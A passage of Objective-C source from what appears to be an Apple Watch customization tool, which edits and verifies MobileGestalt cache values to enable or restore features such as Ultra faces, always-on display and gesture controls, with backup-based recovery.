        if (err) *err = NSLocalizedString(@"Could not read the watch's original face values; no changes were made.", nil);
        return NO;
    }
    if (recoverBrand) memcpy(bytes + layout->valueOffset, &nativeBrand, sizeof(nativeBrand));
    else memcpy(bytes + screenOffset, &nativeScreen, sizeof(nativeScreen));
    NSMutableDictionary *extra = [plist[@"CacheExtra"] mutableCopy];
    if (recoverBrand) [extra removeObjectForKey:@"fuKL2rMywRgQF1wowOA/cg"];
    else [extra removeObjectForKey:@"fdh+s6j3VijuyrK7xLjd7g"];
    plist[@"CacheData"] = data;
    plist[@"CacheExtra"] = extra;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err);
    NSData *savedData = saved[@"CacheData"];
    if (![savedData isEqual:data] || ![saved[@"CacheExtra"] isEqual:extra]) {
        if (err) *err = NSLocalizedString(@"The face values were written but could not be verified.", nil);
        return NO;
    }
    return YES;
}

static BOOL bq_recoverNativeControl(NSString *key, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil;
    if (!plist) return NO;
    if (!bq_ultraCache(plist, &data, NULL, NULL, NULL)) {
        if (err) *err = NSLocalizedString(@"Native control recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0 || (!bq_layoutForBuild(build) || !bq_layoutForBuild(build)->recoveryVerified)) {
        if (err) *err = NSLocalizedString(@"Native control recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    const BQDeviceBrandLayout *layout = bq_layoutForBuild(build);
    NSUInteger actionIndex = layout->actionIndex, gestureIndex = layout->gestureIndex;
    NSUInteger keyboardIndex = layout->keyboardIndex, presenceBase = layout->presenceBase;
    if (presenceBase + actionIndex >= data.length || presenceBase + gestureIndex >= data.length || presenceBase + keyboardIndex >= data.length ||
        actionIndex * 8 >= data.length || gestureIndex * 8 >= data.length || keyboardIndex * 8 >= data.length) {
        if (err) *err = NSLocalizedString(@"Native control recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    void *mg = NULL, *io = NULL;
    bq_native_libraries(&mg, &io);
    void *(*createCache)(void *, const void **, const void **, long, void *) = mg ? dlsym(mg, "MGCreateInMemoryCache") : NULL;
    CFTypeRef (*copyAnswer)(CFStringRef, void *, void *, int *) = mg ? dlsym(mg, "MGCopyAnswerWithCache") : NULL;
    void (*destroyCache)(void *) = mg ? dlsym(mg, "MGCacheDestroy") : NULL;
    uint32_t (*entryFromPath)(uint32_t, const char *) = io ? dlsym(io, "IORegistryEntryFromPath") : NULL;
    CFTypeRef (*copyProperty)(uint32_t, CFStringRef, CFAllocatorRef, uint32_t) = io ? dlsym(io, "IORegistryEntryCreateCFProperty") : NULL;
    int (*releaseObject)(uint32_t) = io ? dlsym(io, "IOObjectRelease") : NULL;
    if (!createCache || !copyAnswer || !destroyCache || !entryFromPath || !copyProperty || !releaseObject) {
        if (err) *err = NSLocalizedString(@"Could not read the watch's original control values; no changes were made.", nil);
        return NO;
    }
    uint32_t buttonsEntry = entryFromPath(0, "IODeviceTree:/buttons");
    CFTypeRef buttonNames = buttonsEntry ? copyProperty(buttonsEntry, CFSTR("button-names"), kCFAllocatorDefault, 0) : NULL;
    if (buttonsEntry) releaseObject(buttonsEntry);
    bool hasApp = false;
    BOOL validButtonNames = NO;
    if (buttonNames && CFGetTypeID(buttonNames) == CFDataGetTypeID()) {
        const uint8_t *names = CFDataGetBytePtr(buttonNames);
        CFIndex length = CFDataGetLength(buttonNames);
        if (length > 0) validButtonNames = BQRecoveryParseButtonNames(names, (size_t)length, &hasApp);
    }
    if (buttonNames) CFRelease(buttonNames);
    uint32_t productEntry = entryFromPath(0, "IODeviceTree:/product");
    CFTypeRef gestureProperty = productEntry ? copyProperty(productEntry, CFSTR("watch-gestures"), kCFAllocatorDefault, 0) : NULL;
    CFTypeRef keyboardProperty = productEntry ? copyProperty(productEntry, CFSTR("watch-keyboard"), kCFAllocatorDefault, 0) : NULL;
    if (productEntry) releaseObject(productEntry);
    BOOL gesturePropertyPresent = gestureProperty != NULL;
    if (gestureProperty) CFRelease(gestureProperty);
    BOOL keyboardPropertyPresent = keyboardProperty != NULL;
    if (keyboardProperty) CFRelease(keyboardProperty);
    void *cache = createCache(NULL, NULL, NULL, 0, NULL);
    if (!cache) {
        if (err) *err = NSLocalizedString(@"Could not read the watch's original control values; no changes were made.", nil);
        return NO;
    }
    int actionError = 0, gestureError = 0, keyboardError = 0;
    CFTypeRef action = copyAnswer(CFSTR("WatchAppButtonCapability"), NULL, cache, &actionError);
    CFTypeRef gesture = copyAnswer(CFSTR("DeviceSupportsElton"), NULL, cache, &gestureError);
    CFTypeRef keyboard = copyAnswer(CFSTR("WatchKeyboardCapability"), NULL, cache, &keyboardError);
    uint8_t *bytes = data.mutableBytes;
    BOOL validAction = bytes[presenceBase + actionIndex] == 1 && validButtonNames &&
        action && !actionError && CFGetTypeID(action) == CFBooleanGetTypeID() && CFBooleanGetValue((CFBooleanRef)action) == hasApp;
    // An absent property can also indicate restricted IORegistry access, so only restore gestures when its presence is confirmed.
    BOOL validGesture = bytes[presenceBase + gestureIndex] == 1 && gesturePropertyPresent &&
        gesture && !gestureError && CFGetTypeID(gesture) == CFBooleanGetTypeID() && CFBooleanGetValue((CFBooleanRef)gesture);
    BOOL validKeyboard = bytes[presenceBase + keyboardIndex] == 1 && keyboardPropertyPresent &&
        keyboard && !keyboardError && CFGetTypeID(keyboard) == CFBooleanGetTypeID() && CFBooleanGetValue((CFBooleanRef)keyboard);
    if (action) CFRelease(action);
    if (gesture) CFRelease(gesture);
    if (keyboard) CFRelease(keyboard);
    destroyCache(cache);
    BOOL restoreAction = [key isEqualToString:@"FBw/2WrPE2supEKosxxoTw"];
    BOOL restoreGesture = [key isEqualToString:@"l1CWke97nbaAcWDqA6T5LA"];
    BOOL restoreKeyboard = [key isEqualToString:@"MQJ1mlVrhOwaUUVJehJSVA"];
    if (!(restoreAction && validAction) && !(restoreGesture && validGesture) && !(restoreKeyboard && validKeyboard)) {
        if (err) *err = NSLocalizedString(@"Could not read the watch's original control values; no changes were made.", nil);
        return NO;
    }
    NSMutableDictionary *extra = [plist[@"CacheExtra"] mutableCopy];
    if (restoreAction) {
        bytes[actionIndex * 8] = hasApp ? 1 : 0;
        extra[@"FBw/2WrPE2supEKosxxoTw"] = @(hasApp);
    }
    if (restoreGesture) {
        bytes[gestureIndex * 8] = 1;
        extra[@"l1CWke97nbaAcWDqA6T5LA"] = @YES;
    }
    if (restoreKeyboard) {
        bytes[keyboardIndex * 8] = 1;
        extra[@"MQJ1mlVrhOwaUUVJehJSVA"] = @YES;
    }
    plist[@"CacheData"] = data;
    plist[@"CacheExtra"] = extra;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err);
    if (![saved[@"CacheData"] isEqual:data] || ![saved[@"CacheExtra"] isEqual:extra]) {
        if (err) *err = NSLocalizedString(@"The control values were written but could not be verified.", nil);
        return NO;
    }
    return YES;
}

// These handlers return true when the corresponding product property exists.
// An unreadable or absent property is ambiguous, so it is never treated as false.
static BOOL bq_recoverNativeAdditional(NSString *key, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil;
    if (!plist) return NO;
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (!bq_ultraCache(plist, &data, NULL, NULL, NULL) ||
        sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0 || (!bq_layoutForBuild(build) || !bq_layoutForBuild(build)->recoveryVerified)) {
        if (err) *err = NSLocalizedString(@"Native additional recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    void *mg = NULL, *io = NULL;
    bq_native_libraries(&mg, &io);
    void *(*createCache)(void *, const void **, const void **, long, void *) = mg ? dlsym(mg, "MGCreateInMemoryCache") : NULL;
    CFTypeRef (*copyAnswer)(CFStringRef, void *, void *, int *) = mg ? dlsym(mg, "MGCopyAnswerWithCache") : NULL;
    void (*destroyCache)(void *) = mg ? dlsym(mg, "MGCacheDestroy") : NULL;
    uint32_t (*entryFromPath)(uint32_t, const char *) = io ? dlsym(io, "IORegistryEntryFromPath") : NULL;
    CFTypeRef (*copyProperty)(uint32_t, CFStringRef, CFAllocatorRef, uint32_t) = io ? dlsym(io, "IORegistryEntryCreateCFProperty") : NULL;
    int (*releaseObject)(uint32_t) = io ? dlsym(io, "IOObjectRelease") : NULL;
    if (!createCache || !copyAnswer || !destroyCache || !entryFromPath || !copyProperty || !releaseObject) {
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original additional values; no changes were made.", nil);
        return NO;
    }
    uint32_t product = entryFromPath(0, "IODeviceTree:/product");
    void *cache = createCache(NULL, NULL, NULL, 0, NULL);
    if (!product || !cache) {
        if (product) releaseObject(product);
        if (cache) destroyCache(cache);
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original additional values; no changes were made.", nil);
        return NO;
    }
    const CFStringRef properties[] = {CFSTR("supports-aod-vibrancy"), CFSTR("env-audio-exp-capable")};
    const CFStringRef answers[] = {CFSTR("DeviceSupportsAODVibrancy"), CFSTR("DeviceSupportsEnvironmentalDosimetry")};
    NSArray<NSString *> *keys = @[@"ykpu7qyhqFweVMKtxNylWA", @"SaW+DA+cbiqDHrex8MTABA"];
    const BQDeviceBrandLayout *layout = bq_layoutForBuild(build);
    NSUInteger indexes[] = {layout->vibrancyIndex, layout->noiseIndex};
    NSUInteger presenceBase = layout->presenceBase;
    uint8_t *bytes = data.mutableBytes;
    NSMutableDictionary *extra = [plist[@"CacheExtra"] mutableCopy];
    NSUInteger restored = 0;
    for (NSUInteger i = 0; i < 2; i++) {
        if (![key isEqualToString:keys[i]]) continue;
        if (presenceBase + indexes[i] >= data.length || indexes[i] * 8 >= data.length || bytes[presenceBase + indexes[i]] != 1) continue;
        CFTypeRef property = copyProperty(product, properties[i], kCFAllocatorDefault, 0);
        int answerError = 0;
        CFTypeRef answer = property ? copyAnswer(answers[i], NULL, cache, &answerError) : NULL;
        BOOL valid = answer && !answerError && CFGetTypeID(answer) == CFBooleanGetTypeID() && CFBooleanGetValue((CFBooleanRef)answer);
        if (property) CFRelease(property);
        if (answer) CFRelease(answer);
        if (!valid) continue;
        bytes[indexes[i] * 8] = 1;
        extra[keys[i]] = @YES;
        restored++;
    }
    releaseObject(product);
    destroyCache(cache);
    if (!restored) {
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original additional values; no changes were made.", nil);
        return NO;
    }
    plist[@"CacheData"] = data;
    plist[@"CacheExtra"] = extra;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err);
    if (![saved[@"CacheData"] isEqual:data] || ![saved[@"CacheExtra"] isEqual:extra]) {
        if (err) *err = NSLocalizedString(@"The additional values were written but could not be verified.", nil);
        return NO;
    }
    return YES;
}

static BOOL bq_recoverNativeAOD(BOOL secondsOnly, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil;
    if (!plist) return NO;
    if (!bq_ultraCache(plist, &data, NULL, NULL, NULL)) {
        if (err) *err = NSLocalizedString(@"Native AOD recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    char build[128] = {0};
    size_t buildLength = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildLength, NULL, 0) != 0 || (!bq_layoutForBuild(build) || !bq_layoutForBuild(build)->recoveryVerified)) {
        if (err) *err = NSLocalizedString(@"Native AOD recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    const BQDeviceBrandLayout *layout = bq_layoutForBuild(build);
    NSUInteger aodIndex = layout->aodIndex, hzIndex = layout->hzIndex, timeIndex = layout->aodTimeIndex;
    NSUInteger presenceBase = layout->presenceBase;
    if (presenceBase + timeIndex >= data.length || timeIndex * 8 >= data.length) {
        if (err) *err = NSLocalizedString(@"Native AOD recovery is unavailable for this watchOS build.", nil);
        return NO;
    }
    uint8_t *bytes = data.mutableBytes;
    if (secondsOnly ? bytes[presenceBase + hzIndex] != 1 :
        (bytes[presenceBase + aodIndex] != 1 || bytes[presenceBase + timeIndex] != 1)) {
        if (err) *err = NSLocalizedString(@"The required AOD values are missing from the cache; no changes were made.", nil);
        return NO;
    }
    void *mg = NULL, *io = NULL;
    bq_native_libraries(&mg, &io);
    void *(*createCache)(void *, const void **, const void **, long, void *) = mg ? dlsym(mg, "MGCreateInMemoryCache") : NULL;
    CFTypeRef (*copyAnswer)(CFStringRef, void *, void *, int *) = mg ? dlsym(mg, "MGCopyAnswerWithCache") : NULL;
    void (*destroyCache)(void *) = mg ? dlsym(mg, "MGCacheDestroy") : NULL;
    uint32_t (*entryFromPath)(uint32_t, const char *) = io ? dlsym(io, "IORegistryEntryFromPath") : NULL;
    CFTypeRef (*copyProperty)(uint32_t, CFStringRef, CFAllocatorRef, uint32_t) = io ? dlsym(io, "IORegistryEntryCreateCFProperty") : NULL;
    int (*releaseObject)(uint32_t) = io ? dlsym(io, "IOObjectRelease") : NULL;
    if (!createCache || !copyAnswer || !destroyCache || !entryFromPath || !copyProperty || !releaseObject) {
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original AOD values; no changes were made.", nil);
        return NO;
    }
    uint32_t display = entryFromPath(0, "IODeviceTree:/arm-io/disp0");
    CFTypeRef alwaysOnTime = display ? copyProperty(display, CFSTR("always-on-time"), kCFAllocatorDefault, 0) : NULL;
    if (display) releaseObject(display);
    BOOL propertyPresent = alwaysOnTime != NULL;
    if (alwaysOnTime) CFRelease(alwaysOnTime);
    if (!propertyPresent) {
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original AOD values; no changes were made.", nil);
        return NO;
    }
    void *cache = createCache(NULL, NULL, NULL, 0, NULL);
    if (!cache) {
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original AOD values; no changes were made.", nil);
        return NO;
    }
    int answerError = 0;
    CFTypeRef answer = copyAnswer(CFSTR("DeviceSupportsAlwaysOnTime"), NULL, cache, &answerError);
    BOOL verified = answer && !answerError && CFGetTypeID(answer) == CFBooleanGetTypeID() && CFBooleanGetValue((CFBooleanRef)answer);
    if (answer) CFRelease(answer);
    destroyCache(cache);
    if (!verified) {
        if (err) *err = NSLocalizedString(@"Could not verify the watch's original AOD values; no changes were made.", nil);
        return NO;
    }
    // On these builds, the presence of always-on-time makes all three handlers return true.
    NSMutableDictionary *extra = [plist[@"CacheExtra"] mutableCopy];
    if (secondsOnly) {
        bytes[hzIndex * 8] = 1;
        extra[@"aoJSd/MXk7M40NgXTM6x+g"] = @YES;
    } else {
        bytes[aodIndex * 8] = 1;
        bytes[timeIndex * 8] = 1;
        extra[@"2OOJf1VhaM7NxfRok3HbWQ"] = @YES;
        extra[@"j8/Omm6s1lsmTDFsXjsBfA"] = @YES;
    }
    plist[@"CacheData"] = data;
    plist[@"CacheExtra"] = extra;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err);
    if (![saved[@"CacheData"] isEqual:data] || ![saved[@"CacheExtra"] isEqual:extra]) {
        if (err) *err = NSLocalizedString(@"The AOD values were written but could not be verified.", nil);
        return NO;
    }
    return YES;
}

static NSArray<NSNumber *> *bq_ultraOptions(const BQDeviceBrandLayout *layout) {
    if (!layout) return nil;
    NSDictionary *entry = bq_buildData(@"MGDefaults", [NSString stringWithUTF8String:layout->build]);
    id options = entry[@"UltraScreenClassOptions"];
    if (![options isKindOfClass:[NSArray class]] || [options count] == 0) return nil;
    for (id value in options) {
        if (![value isKindOfClass:[NSNumber class]] || [value longLongValue] < 0 || [value unsignedLongLongValue] > UINT32_MAX) return nil;
    }
    return options;
}

BOOL BQSupportsLargerUltraFaceLayout(void) {
    return bq_ultraOptions(bq_currentLayout()).count > 1;
}

BOOL BQGetUltraFaceClass(NSInteger *screenClass, NSString **err) {
    NSDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil;
    NSUInteger valueOffset = 0, presentOffset = 0;
    if (!plist || !bq_ultraCache(plist, &data, &valueOffset, &presentOffset, err)) return NO;
    const uint8_t *bytes = data.bytes;
    const BQDeviceBrandLayout *layout = bq_currentLayout();
    uint32_t ultraValue = 0;
    if (!layout || !bq_buildDefault(layout->build, @"UltraEnabledScreenClass", &ultraValue)) {
        if (err) *err = NSLocalizedString(@"Ultra Faces cache layout is not supported on this watchOS build.", nil);
        return NO;
    }
    NSArray<NSNumber *> *options = bq_ultraOptions(layout);
    if (!options) {
        if (err) *err = NSLocalizedString(@"Ultra Faces cache layout is not supported on this watchOS build.", nil);
        return NO;
    }
    uint32_t actual = 0; memcpy(&actual, bytes + valueOffset, sizeof(actual));
    BOOL valid = plist[@"CacheExtra"][@"fdh+s6j3VijuyrK7xLjd7g"] == nil && bytes[presentOffset] == 1 && [options containsObject:@(actual)];
    if (screenClass) *screenClass = valid ? (NSInteger)actual : 0;
    return YES;
}

BOOL BQGetUltraFacesEnabled(BOOL *enabled, NSString **err) {
    NSInteger screenClass = 0;
    if (!BQGetUltraFaceClass(&screenClass, err)) return NO;
    if (enabled) *enabled = screenClass != 0;
    return YES;
}

static BOOL bq_setUltraFaces(BOOL enabled, NSInteger requestedClass, NSString **err) {
    if (!enabled && !BQBackupExists()) return bq_recoverNativeFace(NO, err);
    NSData *backupFile = [NSData dataWithContentsOfFile:BQBackupPath()];
    NSDictionary *backup = backupFile ? [NSPropertyListSerialization propertyListWithData:backupFile options:0 format:NULL error:NULL] : nil;
    if (![backup isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"Back up MobileGestalt first.", nil);
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSMutableData *data = nil, *original = nil;
    NSUInteger valueOffset = 0, presentOffset = 0;
    if (!plist || !bq_ultraCache(plist, &data, &valueOffset, &presentOffset, err)) return NO;
    NSDictionary *beforeChange = [plist copy];
    if (!bq_ultraCache(backup, &original, NULL, NULL, enabled ? err : NULL) ||
        (!enabled && ((const uint8_t *)original.bytes)[presentOffset] != 1)) {
        return enabled ? NO : bq_recoverNativeFace(NO, err);
    }
    uint8_t *bytes = data.mutableBytes;
    const uint8_t *backupBytes = original.bytes;
    if (enabled && bytes[presentOffset] != 1) {
        if (err) *err = NSLocalizedString(@"main-screen-class is not present in CacheData.", nil);
        return NO;
    }
    const BQDeviceBrandLayout *layout = bq_currentLayout();
    uint32_t ultraValue = 0;
    if (!layout || !bq_buildDefault(layout->build, @"UltraEnabledScreenClass", &ultraValue)) {
        if (err) *err = NSLocalizedString(@"Ultra Faces cache layout is not supported on this watchOS build.", nil);
        return NO;
    }
    NSArray<NSNumber *> *options = bq_ultraOptions(layout);
    if (!options) {
        if (err) *err = NSLocalizedString(@"Ultra Faces cache layout is not supported on this watchOS build.", nil);
        return NO;
    }
    BOOL useAlternative = NO;
    if (enabled && requestedClass != 0) {
        if (requestedClass < 0 || (uint64_t)requestedClass > UINT32_MAX || ![options containsObject:@(requestedClass)]) {
            if (err) *err = NSLocalizedString(@"The selected Ultra face layout is unavailable on this watchOS build.", nil);
            return NO;
        }
        ultraValue = (uint32_t)requestedClass;
    }
    uint32_t defaultValue = 0;
    if (!bq_buildDefault(layout->build, @"UltraEnabledScreenClass", &defaultValue)) return NO;
    uint32_t previousValue = 0;
    memcpy(&previousValue, bytes + valueOffset, sizeof(previousValue));
    useAlternative = enabled && (ultraValue != defaultValue ||
        (previousValue != defaultValue && [options containsObject:@(previousValue)]));
    if (useAlternative) {
        uint32_t currentValue = 0, originalValue = 0;
        memcpy(&currentValue, bytes + valueOffset, sizeof(currentValue));
        memcpy(&originalValue, backupBytes + valueOffset, sizeof(originalValue));
        char model[128] = {0}; size_t modelLength = sizeof(model);
        if (sysctlbyname("hw.machine", model, &modelLength, NULL, 0) != 0) {
            if (err) *err = NSLocalizedString(@"Could not identify this watch model.", nil);
            return NO;
        }
        NSDictionary *entry = bq_buildData(@"MGDefaults", [NSString stringWithUTF8String:layout->build]);
        NSDictionary *models = [entry[@"ModelValidation"] isKindOfClass:[NSDictionary class]] ? entry[@"ModelValidation"] : nil;
        id check = models[[NSString stringWithUTF8String:model]];
        uint32_t expectedOriginal = originalValue;
        if (check) {
            id expected = [check isKindOfClass:[NSDictionary class]] ? check[@"ExpectedOriginalScreenClass"] : nil;
            if (![expected isKindOfClass:[NSNumber class]] || [expected longLongValue] < 0 || [expected unsignedLongLongValue] > UINT32_MAX) {
                if (err) *err = NSLocalizedString(@"Ultra Faces cache layout is not supported on this watchOS build.", nil);
                return NO;
            }
            expectedOriginal = [expected unsignedIntValue];
        }
        NSString *key = @"fdh+s6j3VijuyrK7xLjd7g";
        if (!BQUltraAlternativeStateIsValid(currentValue, originalValue, ultraValue, expectedOriginal,
                                       bytes[presentOffset] == 1, backupBytes[presentOffset] == 1,
                                       plist[@"CacheExtra"][key] != nil, backup[@"CacheExtra"][key] != nil,
                                       [options containsObject:@(currentValue)])) {
            if (err) *err = NSLocalizedString(@"Unexpected main-screen-class state; no changes written.", nil);
            return NO;
        }
    }
    uint8_t ultra[] = {ultraValue & 0xff, (ultraValue >> 8) & 0xff, (ultraValue >> 16) & 0xff, (ultraValue >> 24) & 0xff};
    if (enabled) memcpy(bytes + valueOffset, ultra, sizeof(ultra));
    else {
        memcpy(bytes + valueOffset, backupBytes + valueOffset, sizeof(ultra));
        bytes[presentOffset] = backupBytes[presentOffset];
    }
    NSString *key = @"fdh+s6j3VijuyrK7xLjd7g";
    NSMutableDictionary *extra = [plist[@"CacheExtra"] mutableCopy];
    id originalOverride = backup[@"CacheExtra"][key];
    if (enabled || !originalOverride) [extra removeObjectForKey:key];
    else extra[key] = originalOverride;
    plist[@"CacheData"] = data;
    plist[@"CacheExtra"] = extra;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err);
    if (useAlternative && ![saved isEqual:plist]) {
        NSString *restoreError = nil;
        BOOL restored = BQSaveGestalt(beforeChange, &restoreError);
        if (restored) restored = [BQLoadGestalt(NULL) isEqual:beforeChange];
        if (err) *err = restored ? NSLocalizedString(@"Ultra verification failed; the previous cache was restored.", nil)
                                 : NSLocalizedString(@"Ultra verification failed and the previous cache could not be restored.", nil);
        return NO;
    }
    NSMutableData *savedData = nil;
    if (!saved || !bq_ultraCache(saved, &savedData, NULL, NULL, err)) return NO;
    const uint8_t *savedBytes = savedData.bytes;
    id expectedOverride = enabled ? nil : originalOverride;
    id savedOverride = saved[@"CacheExtra"][key];
    if (memcmp(savedBytes + valueOffset, bytes + valueOffset, sizeof(ultra)) != 0 || savedBytes[presentOffset] != bytes[presentOffset] || (expectedOverride ? ![savedOverride isEqual:expectedOverride] : savedOverride != nil)) {
        if (err) *err = NSLocalizedString(@"Ultra Faces cache changes could not be verified.", nil);
        return NO;
    }
    return YES;
}

BOOL BQSetUltraFacesEnabled(BOOL enabled, NSString **err) {
    return bq_setUltraFaces(enabled, 0, err);
}

BOOL BQSetUltraFaceClass(NSInteger screenClass, NSString **err) {
    if (screenClass <= 0) {
        if (err) *err = NSLocalizedString(@"The selected Ultra face layout is unavailable on this watchOS build.", nil);
        return NO;
    }
    return bq_setUltraFaces(YES, screenClass, err);
}

static BOOL bq_setMGCacheExtraKeys(NSArray<NSString *> *keys, BOOL enabled, NSString **err) {
    NSArray<NSString *> *recoverableKeys = @[@"2OOJf1VhaM7NxfRok3HbWQ", @"j8/Omm6s1lsmTDFsXjsBfA", @"aoJSd/MXk7M40NgXTM6x+g", @"FBw/2WrPE2supEKosxxoTw", @"l1CWke97nbaAcWDqA6T5LA", @"MQJ1mlVrhOwaUUVJehJSVA", @"ykpu7qyhqFweVMKtxNylWA", @"SaW+DA+cbiqDHrex8MTABA"];
    BOOL recoverable = keys.count > 0;
    for (NSString *key in keys) if (![recoverableKeys containsObject:key]) recoverable = NO;
    if (!enabled && recoverable && BQBackupExists()) {
        NSDictionary *backup = [NSDictionary dictionaryWithContentsOfFile:BQBackupPath()];
        NSMutableDictionary *current = BQLoadGestalt(err);
        if (!current) return NO;
        NSMutableData *currentData = nil, *originalData = nil;
        if (bq_ultraCache(current, &currentData, NULL, NULL, NULL) &&
            bq_ultraCache(backup, &originalData, NULL, NULL, NULL)) {
            const BQDeviceBrandLayout *layout = bq_currentLayout();
            if (!layout) return NO;
            NSUInteger indexes[] = {layout->aodIndex, layout->aodTimeIndex, layout->hzIndex,
                layout->actionIndex, layout->gestureIndex, layout->keyboardIndex, layout->vibrancyIndex, layout->noiseIndex};
            NSUInteger presenceBase = layout->presenceBase;
            const uint8_t *original = originalData.bytes;
            NSUInteger usableCount = 0;
            for (NSString *key in keys) {
                NSUInteger index = indexes[[recoverableKeys indexOfObject:key]];
                id override = backup[@"CacheExtra"][key];
                BOOL overrideValid = [override isKindOfClass:[NSNumber class]] &&
                    ([override integerValue] == 0 || [override integerValue] == 1);
                BOOL slotValid = BQRecoveryBoolSlotIsUsable(original, originalData.length, presenceBase, index);
                if ((override && overrideValid) || (!override && slotValid)) usableCount++;
            }
            if (usableCount > 0 && usableCount != keys.count) {
                if (err) *err = NSLocalizedString(@"The MobileGestalt backup is invalid.", nil);
                return NO;
            }
            if (usableCount == keys.count) {
                uint8_t *bytes = currentData.mutableBytes;
                NSMutableDictionary *extra = [current[@"CacheExtra"] mutableCopy];
                NSDictionary *originalExtra = backup[@"CacheExtra"];
                for (NSString *key in keys) {
                    NSUInteger index = indexes[[recoverableKeys indexOfObject:key]];
                    if (BQRecoveryBoolSlotIsUsable(original, originalData.length, presenceBase, index)) {
                        memcpy(bytes + index * 8, original + index * 8, 8);
                        bytes[presenceBase + index] = original[presenceBase + index];
                    }
                    id override = originalExtra[key];
                    if (override) extra[key] = override; else [extra removeObjectForKey:key];
                }
                current[@"CacheData"] = currentData;
                current[@"CacheExtra"] = extra;
                if (!BQSaveGestalt(current, err)) return NO;
                NSDictionary *saved = BQLoadGestalt(err);
                if (![saved[@"CacheData"] isEqual:currentData] || ![saved[@"CacheExtra"] isEqual:extra]) {
                    if (err) *err = NSLocalizedString(@"The cache was written, but the original values could not be verified.", nil);
                    return NO;
                }
                return YES;
            }
        }
    }
    if (!enabled && recoverable) {
        if ([keys isEqualToArray:@[@"2OOJf1VhaM7NxfRok3HbWQ", @"j8/Omm6s1lsmTDFsXjsBfA"]]) return bq_recoverNativeAOD(NO, err);
        if ([keys isEqualToArray:@[@"aoJSd/MXk7M40NgXTM6x+g"]]) return bq_recoverNativeAOD(YES, err);
        NSString *key = keys.count == 1 ? keys.firstObject : nil;
        if ([key isEqualToString:@"FBw/2WrPE2supEKosxxoTw"] || [key isEqualToString:@"l1CWke97nbaAcWDqA6T5LA"] || [key isEqualToString:@"MQJ1mlVrhOwaUUVJehJSVA"]) return bq_recoverNativeControl(key, err);
        if ([key isEqualToString:@"ykpu7qyhqFweVMKtxNylWA"] || [key isEqualToString:@"SaW+DA+cbiqDHrex8MTABA"]) return bq_recoverNativeAdditional(key, err);
    }
    if (!BQBackupExists()) {
        if (err) *err = NSLocalizedString(@"Back up MobileGestalt first.", nil);
        return NO;
    }

    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    id cacheExtra = plist[@"CacheExtra"];
    if (![cacheExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"MobileGestalt CacheExtra is missing or invalid.", nil);
        return NO;
    }

    NSMutableDictionary *updated = [cacheExtra mutableCopy];
    NSNumber *storedValue = @(enabled);
    for (NSString *key in keys) updated[key] = storedValue;
    plist[@"CacheExtra"] = updated;
    if (!BQSaveGestalt(plist, err)) return NO;

    NSMutableDictionary *check = BQLoadGestalt(err);
    NSDictionary *savedExtra = check[@"CacheExtra"];
    for (NSString *key in keys) {
        id value = savedExtra[key];
        if (![value respondsToSelector:@selector(boolValue)] || [value boolValue] != enabled) {
            if (err) *err = [NSString stringWithFormat:NSLocalizedString(@"MobileGestalt override %@ did not save the requested state.", nil), key];
            return NO;
        }
    }
    BQLog(@"MG CacheExtra %@ %@", enabled ? @"enabled" : @"disabled", [keys componentsJoinedByString:@", "]);
    return YES;
}

static BOOL bq_getMGCacheExtraKeys(NSArray<NSString *> *keys, BOOL *enabled, NSString **err) {
    if (!BQCoreInit()) {
        if (err) *err = @"MobileGestalt access is unavailable on this device.";
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    id cacheExtra = plist[@"CacheExtra"];
    if (![cacheExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"MobileGestalt CacheExtra is missing or invalid.", nil);
        return NO;
    }
    BOOL allEnabled = YES;
    NSDictionary *extra = cacheExtra;
    for (NSString *key in keys) {
        id value = extra[key];
        if (![value respondsToSelector:@selector(boolValue)] || ![value boolValue]) {
            allEnabled = NO;
            break;
        }
    }
    if (enabled) *enabled = allEnabled;
    return YES;
}

static BOOL bq_setMGCacheExtraStrings(NSDictionary<NSString *, NSString *> *changes, NSString **err) {
    if (!BQBackupExists()) {
        if (err) *err = NSLocalizedString(@"Back up MobileGestalt first.", nil);
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    id cacheExtra = plist[@"CacheExtra"];
    if (![cacheExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"MobileGestalt CacheExtra is missing or invalid.", nil);
        return NO;
    }
    NSMutableDictionary *updated = [cacheExtra mutableCopy];
    [updated addEntriesFromDictionary:changes];
    plist[@"CacheExtra"] = updated;
    if (!BQSaveGestalt(plist, err)) return NO;

    NSMutableDictionary *check = BQLoadGestalt(err);
